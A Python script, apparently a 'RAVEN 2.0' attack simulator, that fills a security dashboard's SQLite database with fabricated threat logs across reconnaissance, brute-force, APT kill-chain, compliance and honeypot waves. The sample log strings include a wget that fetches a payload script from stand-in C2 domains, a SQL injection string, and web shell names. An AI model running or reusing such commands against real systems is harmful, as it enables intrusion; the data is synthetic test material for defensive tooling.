
import time
import sqlite3
import random
import argparse
from datetime import datetime, timedelta
from pathlib import Path
from colorama import init, Fore

init(autoreset=True)

DB_PATH = Path(__file__).parent / "raven.db"

# ── Randomization Pools ───────────────────────────────────

ATTACKER_IPS = [
    "185.220.101.34", "45.155.205.233", "194.26.29.102",
    "103.75.201.2", "91.240.118.172", "178.128.23.9",
    "23.129.64.130", "5.188.206.18", "139.59.224.70",
    "202.14.109.55", "77.247.181.165", "198.98.56.78",
]

INTERNAL_IPS = ["192.168.1.100", "10.0.0.55", "172.16.0.22", "10.10.5.8"]

USERNAMES = ["root", "admin", "ubuntu", "ec2-user", "pi", "vagrant", "www-data", "deploy"]

FILE_PATHS = ["/tmp/", "/var/www/html/", "/home/ubuntu/", "/opt/", "/etc/", "/var/log/"]

C2_DOMAINS = [
    "cdn{n}.update-srv.net", "cdn{n}.cdn-cache.io", "cdn{n}.api-gateway.xyz",
    "svc{n}.telemetry-cdn.com", "static{n}.cloud-edge.org",
]

HONEYPOT_PORTS = [2222, 2121, 8080, 9999]

def _rport():
    return random.randint(32768, 65535)

def _c2():
    return random.choice(C2_DOMAINS).format(n=random.randint(10, 99))

def _user():
    return random.choice(USERNAMES)

def _fpath():
    return random.choice(FILE_PATHS)

def _ext_ip():
    return random.choice(ATTACKER_IPS)

def _int_ip():
    return random.choice(INTERNAL_IPS)

# ── Attack Scenario Definitions (22 types) ────────────────

SCENARIOS = [
    {
        "event_type": "SSH_BRUTE_FORCE",
        "raw_log": lambda ip: f"Failed password for {_user()} from {ip} port {_rport()} ssh2 — {random.randint(15,80)} attempts in {random.randint(1,5)} min",
        "severity": "Critical",
        "ai_analysis": "Rapid-fire SSH credential stuffing from a known malicious IP. Automated tooling (Hydra/Medusa) signature detected in timing patterns.",
        "recommendation": "Block IP at firewall. Disable password auth, enforce key-only SSH.",
    },
    {
        "event_type": "PORT_SCAN",
        "raw_log": lambda ip: f"SYN scan on ports 22,80,443,3306,5432,8080,8443,6379 from {ip}:{_rport()}",
        "severity": "High",
        "ai_analysis": "Systematic port enumeration targeting common service ports. Nmap SYN scan fingerprint detected in packet timing.",
        "recommendation": "Enable IDS rules. Rate-limit connections. Review exposed services.",
    },
    {
        "event_type": "MALWARE_DOWNLOAD",
        "raw_log": lambda ip: f"wget http://{_c2()}/payload_{random.randint(100,999)}.sh executed by {_user()} from {ip}",
        "severity": "Critical",
        "ai_analysis": "Remote payload download via wget from a known C2 domain. Likely post-exploitation stage deploying persistence toolkit.",
        "recommendation": "Isolate host immediately. Kill wget process. Scan for dropped files.",
    },
    {
        "event_type": "PRIVILEGE_ESCALATION",
        "raw_log": lambda ip: f"sudo: user '{_user()}' NOT in sudoers file. CVE-2021-4034 PwnKit probe from {ip}",
        "severity": "High",
        "ai_analysis": "Privilege escalation attempt via sudoers bypass. PwnKit (Polkit) exploit signature detected in syscall trace.",
        "recommendation": "Lock compromised account. Patch polkit. Audit sudoers file.",
    },
    {
        "event_type": "DATA_EXFILTRATION",
        "raw_log": lambda ip: f"Unusual outbound: {random.uniform(0.5, 8.0):.1f}GB to {ip}:{_rport()} over HTTPS — {random.randint(2,30)} min duration",
        "severity": "Critical",
        "ai_analysis": "Large-volume encrypted data exfiltration detected. Transfer rate and duration suggest database dump or archive theft.",
        "recommendation": "Block outbound connection. Identify source process. Check for compromised credentials.",
    },
    {
        "event_type": "HONEYPOT_TRIGGERED",
        "raw_log": lambda ip: f"Connection to fake SSH on port 2222 from {ip}:{_rport()} payload: SSH-2.0-libssh_{random.randint(1,9)}",
        "severity": "Medium",
        "ai_analysis": "Honeypot decoy service triggered. Attacker probing non-production service indicates active reconnaissance phase.",
        "recommendation": "Add IP to watchlist. Monitor for lateral movement. No production impact.",
        "honeypot_port": 2222,
    },
    {
        "event_type": "SUSPICIOUS_LOGIN",
        "raw_log": lambda ip: f"Successful login for {_user()} from {ip} at {random.randint(1,5)}:{random.randint(10,59):02d} AM — geo: {'Moscow' if random.random()>0.5 else 'Shanghai'}",
        "severity": "High",
        "ai_analysis": "After-hours login from anomalous geolocation. Credential compromise likely via phishing or credential dump.",
        "recommendation": "Force password reset. Enable MFA. Verify with account owner.",
    },
    {
        "event_type": "RDP_BRUTE_FORCE",
        "raw_log": lambda ip: f"RDP auth failure from {ip}:{_rport()} — {random.randint(20,60)} failed attempts in {random.randint(1,4)} min (NLA bypass attempt)",
        "severity": "Critical",
        "ai_analysis": "Sustained RDP brute-force targeting NLA pre-auth. BlueKeep/RDGateway exploit probe detected in handshake.",
        "recommendation": "Disable RDP or restrict to VPN-only. Enable NLA. Block source IP.",
    },
    {
        "event_type": "DNS_EXFILTRATION",
        "raw_log": lambda ip: f"DNS anomaly: {random.randint(500,2000)} TXT queries to {_c2()} from {ip} in {random.randint(3,15)} min",
        "severity": "Critical",
        "ai_analysis": "DNS tunneling detected. High-entropy TXT record queries at sustained rate indicate covert data exfiltration channel.",
        "recommendation": "Block DNS to external resolvers. Force internal DNS. Inspect query payloads.",
    },
    {
        "event_type": "WEB_SHELL_UPLOAD",
        "raw_log": lambda ip: f"POST /wp-admin/upload.php from {ip}:{_rport()} — PHP webshell '{random.choice(['c99','r57','b374k'])}.php' in multipart body",
        "severity": "Critical",
        "ai_analysis": "Web shell upload via CMS admin panel. File contains eval/base64 execution primitives typical of PHP backdoors.",
        "recommendation": "Delete uploaded shell. Rotate CMS credentials. Patch upload handler.",
    },
    {
        "event_type": "SQL_INJECTION",
        "raw_log": lambda ip: f"HTTP 500 on /api/users?id=1'+OR+'1'='1 from {ip}:{_rport()} — WAF rule SQLi-001 triggered",
        "severity": "High",
        "ai_analysis": "Classic UNION-based SQL injection attempt. Error-based payload indicates manual testing, not automated scanner.",
        "recommendation": "Enable parameterized queries. Review WAF rules. Audit API input validation.",
    },
    {
        "event_type": "C2_BEACON",
        "raw_log": lambda ip: f"Regular HTTPS to {ip}:{443} every 60s ±{random.randint(2,8)}s — JA3 hash matches Cobalt Strike beacon",
        "severity": "Critical",
        "ai_analysis": "Command-and-control beacon with jitter pattern matching Cobalt Strike Malleable C2 profile. Active implant confirmed.",
        "recommendation": "Isolate host. Block C2 IP/domain. Memory forensics for implant extraction.",
    },
    {
        "event_type": "LATERAL_MOVEMENT",
        "raw_log": lambda ip: f"SMB from {ip} to {_int_ip()},{_int_ip()},{_int_ip()} within 90s — PsExec service install detected",
        "severity": "Critical",
        "ai_analysis": "Rapid lateral spread via SMB/PsExec to multiple internal hosts. Attacker has valid domain credentials and is pivoting.",
        "recommendation": "Segment network. Disable SMB where unnecessary. Reset domain admin passwords.",
    },
    {
        "event_type": "CRYPTOMINER",
        "raw_log": lambda ip: f"Process 'xmrig' PID {random.randint(1000,9999)} consuming {random.randint(85,99)}% CPU — pool.minexmr.com from {ip}",
        "severity": "High",
        "ai_analysis": "Cryptocurrency miner deployed on compromised host. XMRig binary communicating with Monero mining pool.",
        "recommendation": "Kill miner process. Remove binary. Investigate initial access vector.",
    },
    {
        "event_type": "LOG_TAMPERING",
        "raw_log": lambda ip: f"auditd: {random.choice(['/var/log/auth.log','/var/log/syslog','/var/log/secure'])} truncated to 0 bytes by PID from {ip}",
        "severity": "Critical",
        "ai_analysis": "Anti-forensics activity detected. Attacker clearing log files to destroy evidence of prior intrusion stages.",
        "recommendation": "Restore from centralized log server. Enable immutable logging. Investigate full kill chain.",
    },
    {
        "event_type": "RANSOMWARE",
        "raw_log": lambda ip: f"Mass rename: {random.randint(200,2000)} files received .encrypted extension in {_fpath()} — from PID on {ip}",
        "severity": "Critical",
        "ai_analysis": "Active ransomware encryption in progress. File extension pattern matches LockBit/BlackCat variant.",
        "recommendation": "ISOLATE HOST NOW. Disconnect from network. Do NOT reboot. Engage IR team.",
    },
    {
        "event_type": "FTP_ANON_ACCESS",
        "raw_log": lambda ip: f"Anonymous FTP login from {ip}:{_rport()} — {random.randint(10,50)} files ({random.uniform(0.1,2.0):.1f}GB) downloaded in {random.randint(2,8)} min",
        "severity": "Medium",
        "ai_analysis": "Unauthenticated FTP data access. Anonymous login enabled on production server exposing sensitive directories.",
        "recommendation": "Disable anonymous FTP. Audit exposed files. Switch to SFTP.",
        "honeypot_port": 2121,
    },
    {
        "event_type": "PASS_THE_HASH",
        "raw_log": lambda ip: f"NTLM auth with reused hash from {ip} — user {_user()}, no interactive logon, ticket-granting anomaly",
        "severity": "Critical",
        "ai_analysis": "Pass-the-Hash attack using stolen NTLM credential hash. Attacker bypassing password authentication entirely.",
        "recommendation": "Reset affected account. Enable Credential Guard. Audit NTLM usage.",
    },
    {
        "event_type": "KERBEROASTING",
        "raw_log": lambda ip: f"Kerberos TGS: {random.randint(80,200)} service tickets requested in {random.randint(5,15)}s from {ip} — SPN enumeration",
        "severity": "High",
        "ai_analysis": "Kerberoasting attack harvesting service ticket hashes for offline cracking. Targeting service accounts with weak passwords.",
        "recommendation": "Rotate service account passwords to 25+ chars. Enable AES-only Kerberos.",
    },
    {
        "event_type": "DOCKER_ESCAPE",
        "raw_log": lambda ip: f"Container breakout: --privileged abuse PID {random.randint(1000,9999)} mounting /host/root from {ip}",
        "severity": "Critical",
        "ai_analysis": "Privileged container escape to host filesystem. Attacker gained root on container host via mount namespace abuse.",
        "recommendation": "Remove --privileged flag. Enable seccomp/AppArmor. Audit container configs.",
    },
    {
        "event_type": "ZERO_DAY_PROBE",
        "raw_log": lambda ip: f"Unknown shellcode in TLS ClientHello on port 443 from {ip}:{_rport()} — no CVE match, signature heuristic",
        "severity": "Critical",
        "ai_analysis": "Potential zero-day exploit payload detected via heuristic analysis. No matching CVE signature — novel attack vector.",
        "recommendation": "Capture full PCAP. Isolate target. Escalate to threat intel team for analysis.",
    },
    {
        "event_type": "DDoS_INCOMING",
        "raw_log": lambda ip: f"SYN flood: {random.randint(10000,100000)} pkt/s from {ip} targeting port 80 — rate limiter engaged",
        "severity": "High",
        "ai_analysis": "Volumetric DDoS attack via SYN flood. Single-source indicates botnet node or amplification reflector.",
        "recommendation": "Enable SYN cookies. Engage upstream DDoS mitigation. Rate-limit at edge.",
    },
]

# ── Database Helpers ──────────────────────────────────────

def _get_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def _inject_threat(cursor, ts, ip, scenario):
    """Insert a threat row and optionally a honeypot_events row."""
    raw = scenario["raw_log"](ip)
    cursor.execute(
        "INSERT INTO threats (timestamp, source_ip, event_type, raw_log, severity, ai_analysis, recommendation, alerted) VALUES (?,?,?,?,?,?,?,?)",
        (ts, ip, scenario["event_type"], raw, scenario["severity"], scenario["ai_analysis"], scenario["recommendation"], 0),
    )
    # Also inject honeypot event if applicable
    hp_port = scenario.get("honeypot_port")
    if hp_port or scenario["event_type"] in ("HONEYPOT_TRIGGERED",):
        port = hp_port or 2222
        cursor.execute(
            "INSERT INTO honeypot_events (timestamp, attacker_ip, port, payload) VALUES (?,?,?,?)",
            (ts, ip, port, raw[:200]),
        )
    sev_color = {
        "Critical": Fore.RED, "High": Fore.YELLOW,
        "Medium": Fore.CYAN, "Low": Fore.WHITE,
    }.get(scenario["severity"], Fore.WHITE)
    print(f"  {sev_color}[{scenario['severity']:>8}] {ts[11:19]} {scenario['event_type']:<22} ← {ip}")

def _countdown(seconds, message):
    print(f"\n{Fore.CYAN}{message}")
    for i in range(seconds, 0, -1):
        print(f"{Fore.YELLOW}  T-{i}s...", end='\r')
        time.sleep(1)
    print(" " * 30, end='\r')

# ── Wave Functions ────────────────────────────────────────

def wave_recon(cursor):
    """Wave 1: Reconnaissance & probing with honeypot triggers."""
    print(f"\n{Fore.MAGENTA}{'━'*50}")
    print(f"{Fore.MAGENTA}  WAVE 1: Reconnaissance & Probing")
    print(f"{Fore.MAGENTA}{'━'*50}")
    now = datetime.now()
    # Honeypot probes
    for i in range(3):
        ip = _ext_ip()
        ts = (now + timedelta(seconds=i * 2)).isoformat()
        hp_scenario = SCENARIOS[5]  # HONEYPOT_TRIGGERED
        _inject_threat(cursor, ts, ip, hp_scenario)
    # Port scans
    for i in range(2):
        ip = _ext_ip()
        ts = (now + timedelta(seconds=6 + i * 3)).isoformat()
        _inject_threat(cursor, ts, ip, SCENARIOS[1])  # PORT_SCAN
    # FTP anonymous
    ip = _ext_ip()
    ts = (now + timedelta(seconds=12)).isoformat()
    _inject_threat(cursor, ts, ip, SCENARIOS[16])  # FTP_ANON_ACCESS
    cursor.connection.commit()
    print(f"\n{Fore.GREEN}  ✓ 6 recon events injected (3 honeypot + 2 port scans + 1 FTP)")

def wave_brute(cursor):
    """Wave 2: Brute force attacks (SSH + RDP)."""
    print(f"\n{Fore.MAGENTA}{'━'*50}")
    print(f"{Fore.MAGENTA}  WAVE 2: Brute Force Assault")
    print(f"{Fore.MAGENTA}{'━'*50}")
    base = datetime.now()
    # SSH brute force burst
    ssh_ip = _ext_ip()
    for i in range(8):
        ts = (base + timedelta(seconds=i)).isoformat()
        _inject_threat(cursor, ts, ssh_ip, SCENARIOS[0])
    # RDP brute force
    rdp_ip = _ext_ip()
    for i in range(5):
        ts = (base + timedelta(seconds=8 + i)).isoformat()
        _inject_threat(cursor, ts, rdp_ip, SCENARIOS[7])
    cursor.connection.commit()
    print(f"\n{Fore.GREEN}  ✓ 13 brute-force events (8 SSH from {ssh_ip}, 5 RDP from {rdp_ip})")
    print(f"{Fore.YELLOW}  >> Security score will DROP. Telegram alerts should fire!")

def wave_apt(cursor):
    """Wave 3: Full APT kill chain following MITRE ATT&CK order."""
    print(f"\n{Fore.MAGENTA}{'━'*50}")
    print(f"{Fore.MAGENTA}  WAVE 3: Advanced Persistent Threat — Kill Chain")
    print(f"{Fore.MAGENTA}{'━'*50}")
    apt_ip = _ext_ip()
    print(f"{Fore.RED}  APT Actor IP: {apt_ip}")
    print(f"{Fore.RED}  Following MITRE ATT&CK kill chain...\n")

    steps = [
        ("RECONNAISSANCE",    SCENARIOS[1],  3,  "TA0043 Reconnaissance"),
        ("INITIAL ACCESS",    SCENARIOS[9],  5,  "TA0001 Initial Access"),
        ("EXECUTION",         SCENARIOS[2],  4,  "TA0002 Execution"),
        ("PERSISTENCE",       SCENARIOS[6],  3,  "TA0003 Persistence"),
        ("PRIV ESCALATION",   SCENARIOS[3],  5,  "TA0004 Privilege Escalation"),
        ("DEFENSE EVASION",   SCENARIOS[14], 3,  "TA0005 Defense Evasion"),
        ("CREDENTIAL ACCESS", SCENARIOS[17], 4,  "TA0006 Credential Access"),
        ("LATERAL MOVEMENT",  SCENARIOS[12], 4,  "TA0008 Lateral Movement"),
        ("EXFILTRATION",      SCENARIOS[8],  3,  "TA0010 Exfiltration"),
        ("IMPACT",            SCENARIOS[15], 2,  "TA0040 Impact"),
    ]

    for i, (phase, scenario, delay, mitre) in enumerate(steps, 1):
        ts = datetime.now().isoformat()
        print(f"  {Fore.CYAN}Step {i:>2}/10 │ {mitre:<35} │ ", end="")
        _inject_threat(cursor, ts, apt_ip, scenario)
        cursor.connection.commit()
        if i < len(steps):
            time.sleep(delay)

    print(f"\n{Fore.RED}  ⚠  FULL KILL CHAIN COMPLETE — 10 events from {apt_ip}")
    print(f"{Fore.YELLOW}  >> Dashboard should show {apt_ip} with 10+ correlated events!")

def wave_compliance(cursor):
    """Wave 4: Inject compliance audit failures."""
    print(f"\n{Fore.MAGENTA}{'━'*50}")
    print(f"{Fore.MAGENTA}  WAVE 4: Compliance Audit Failures")
    print(f"{Fore.MAGENTA}{'━'*50}")
    t = datetime.now().isoformat()
    failures = [
        ("Windows Firewall", "FAIL", "Firewall service is STOPPED — all ports exposed"),
        ("Antivirus Status", "FAIL", "No active antivirus engine detected on system"),
        ("Password Policy", "FAIL", "Minimum length 4 chars — below 12-char requirement"),
        ("Disk Encryption", "FAIL", "System drive C: is not encrypted with BitLocker"),
        ("Auto-Update", "PASS", "Windows Update is enabled and current"),
        ("SSH Key Auth", "PASS", "Password authentication disabled in sshd_config"),
        ("Audit Logging", "WARN", "Log rotation configured but no remote syslog target"),
    ]
    for name, status, detail in failures:
        cursor.execute(
            "INSERT INTO audit_results (check_name, status, detail, timestamp) VALUES (?,?,?,?)",
            (name, status, detail, t),
        )
        icon = {"PASS": Fore.GREEN + "✓", "FAIL": Fore.RED + "✗", "WARN": Fore.YELLOW + "⚠"}.get(status, "?")
        print(f"  {icon} {Fore.RESET}{name}: {status} — {detail[:60]}")
    cursor.connection.commit()
    print(f"\n{Fore.GREEN}  ✓ 7 audit results injected (4 FAIL, 2 PASS, 1 WARN)")

def wave_honeypot(cursor):
    """Dedicated honeypot wave — fills honeypot_events table."""
    print(f"\n{Fore.MAGENTA}{'━'*50}")
    print(f"{Fore.MAGENTA}  WAVE: Honeypot Deception Events")
    print(f"{Fore.MAGENTA}{'━'*50}")
    base = datetime.now()
    honeypot_scenarios = [s for s in SCENARIOS if s.get("honeypot_port") or s["event_type"] == "HONEYPOT_TRIGGERED"]
    for i in range(12):
        ip = _ext_ip()
        ts = (base + timedelta(seconds=i * random.randint(2, 8))).isoformat()
        scenario = random.choice(honeypot_scenarios)
        _inject_threat(cursor, ts, ip, scenario)
    cursor.connection.commit()
    print(f"\n{Fore.GREEN}  ✓ 12 honeypot events injected into both tables")

def wave_stress(cursor):
    """Stress test: 50 random events spread across the last 24 hours."""
    print(f"\n{Fore.MAGENTA}{'━'*50}")
    print(f"{Fore.MAGENTA}  WAVE: Stress Test — 50 Events / 24 Hours")
    print(f"{Fore.MAGENTA}{'━'*50}")
    now = datetime.now()
    for i in range(50):
        scenario = random.choice(SCENARIOS)
        ip = _ext_ip()
        ts = (now - timedelta(hours=random.uniform(0, 24))).isoformat()
        _inject_threat(cursor, ts, ip, scenario)
    cursor.connection.commit()
    print(f"\n{Fore.GREEN}  ✓ 50 random threat events spread across 24h")
    print(f"{Fore.YELLOW}  >> Analytics charts will now have meaningful data!")

# ── Main Entry Point ──────────────────────────────────────

BANNER = f"""{Fore.RED}
    ╔══════════════════════════════════════════════════╗
    ║         RAVEN 2.0 — ATTACK SIMULATOR             ║
    ║    Advanced Threat Injection & Kill Chains        ║
    ║    Make sure the dashboard is running first!      ║
    ╚══════════════════════════════════════════════════╝
{Fore.RESET}"""

def run_simulation(wave=None):
    print(BANNER)
    conn = _get_conn()
    cursor = conn.cursor()

    if wave == "1" or wave == "recon":
        wave_recon(cursor)
    elif wave == "2" or wave == "brute":
        wave_brute(cursor)
    elif wave == "3" or wave == "compliance":
        wave_compliance(cursor)
    elif wave == "apt":
        wave_apt(cursor)
    elif wave == "stress":
        wave_stress(cursor)
    elif wave == "honeypot":
        wave_honeypot(cursor)
    else:
        # Full simulation — all waves with countdowns
        wave_recon(cursor)
        _countdown(6, "Escalating to brute force wave...")
        wave_brute(cursor)
        _countdown(8, "Deploying advanced persistent threat...")
        wave_apt(cursor)
        _countdown(6, "Injecting compliance failures...")
        wave_compliance(cursor)
        _countdown(4, "Flooding honeypot services...")
        wave_honeypot(cursor)

    conn.close()

    total_threats = 0
    total_hp = 0
    try:
        c2 = sqlite3.connect(DB_PATH)
        cur = c2.cursor()
        cur.execute("SELECT COUNT(*) FROM threats")
        total_threats = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM honeypot_events")
        total_hp = cur.fetchone()[0]
        c2.close()
    except Exception:
        pass

    print(f"""\n{Fore.GREEN}
    ╔══════════════════════════════════════════════════╗
    ║              SIMULATION COMPLETE                  ║
    ║                                                  ║
    ║  Total threats in DB:     {total_threats:<6}                 ║
    ║  Total honeypot events:   {total_hp:<6}                 ║
    ║                                                  ║
    ║  ✓ Check dashboard for live results              ║
    ║  ✓ Check Telegram for critical alerts            ║
    ║  ✓ Try 'Export PDF' in dashboard                 ║
    ║  ✓ Open Analytics tab for charts                 ║
    ╚══════════════════════════════════════════════════╝
{Fore.RESET}""")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RAVEN 2.0 Attack Simulator")
    parser.add_argument("--wave", type=str, default=None,
                        help="Wave to run: 1/recon, 2/brute, 3/compliance, apt, stress, honeypot (default: all)")
    args = parser.parse_args()
    run_simulation(args.wave)
